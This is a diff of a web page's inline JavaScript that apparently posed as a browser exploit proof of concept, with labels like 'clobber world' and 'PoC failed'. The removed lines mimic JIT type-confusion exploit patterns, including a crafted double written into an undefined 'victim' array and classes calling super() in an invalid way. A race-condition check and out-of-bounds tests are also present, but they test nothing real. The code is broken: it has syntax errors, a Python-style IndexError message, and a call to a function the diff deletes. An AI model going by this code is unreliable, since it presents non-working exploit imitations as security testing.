@@ -55,41 +55,10 @@
     </div>
 
     <script>
-        class Base {
-            constructor() {
-                super();
-                super.prototype = 1;
-            }
-        }
-
-        class MyFunction extends Base {
-            constructor() {
-                super();
-                super.prototype = 1;
-            }
-        }
-
-        function opt(flag) {
-            victim[0] = 13.37;
-            victim[1] = 13.37;
-            if (flag) {
-                victim[1] = victim[1];
-            }
-            victim[1] = 3.54484805889626e-310;
-        }
-
-        async function performTest(testFunction) {
-            try {
-                await testFunction();
-            } catch (error) {
-                console.error(`Error in ${testFunction.name}:`, error.message, error.stack);
-            }
-        }
-
-        function exploitArrayHandling() {
+        function exploitClobberWorld() {
             let largeArray = new Array(1000000);
             largeArray[999999] = 1;
-            console.time("Out-of-bounds access test");
+            console.time("Clobber world test");
 
             // Out-of-bounds access
             try {
@@ -106,7 +75,7 @@
                 console.error("Caught IndexError for out-of-bounds write", error);
             }
 
-            console.timeEnd("Out-of-bounds access test");
+            console.timeEnd("Clobber world test");
         }
 
         function logStatus(message) {
@@ -135,40 +104,12 @@
             hideContent();
 
             try {
-                // Perform the array handling PoC
-                logStatus("Starting array handling PoC...");
-                await performTest(exploitArrayHandling);
+                // Perform the clobber world test
+                logStatus("Starting clobber world test...");
+                await performTest(exploitClobberWorld);
 
-                // Introduce a race condition
-                logStatus("Introducing race condition...");
-                let raceCondition = async () => {
-                    let value1 = 0;
-                    let value2 = 0;
-
-                    // Simulate concurrent access
-                    (async () => {
-                        await new Promise(resolve => setTimeout(resolve, 100));
-                        value1 = 1;
-                        logStatus("Concurrent access to value1");
-                    })();
-
-                    (async () => {
-                        await new Promise(resolve => setTimeout(resolve, 50));
-                        value2 = 2;
-                        logStatus("Concurrent access to value2");
-                    })();
-
-                    // Check the values
-                    if (value1 === 1 && value2 === 2) {
-                        logStatus("Race condition detected");
-                        showMessage("Race condition detected");
-                    } else {
-                        logStatus("Race condition not detected");
-                        showMessage("Race condition not detected");
-                    }
-                };
-
-                await raceCondition();
+                logStatus("Clobber world test completed");
+                showMessage("Clobber world test completed");
             } catch (error) {
                 console.error("Error encountered during PoC execution:", error);
                 showMessage("PoC failed");
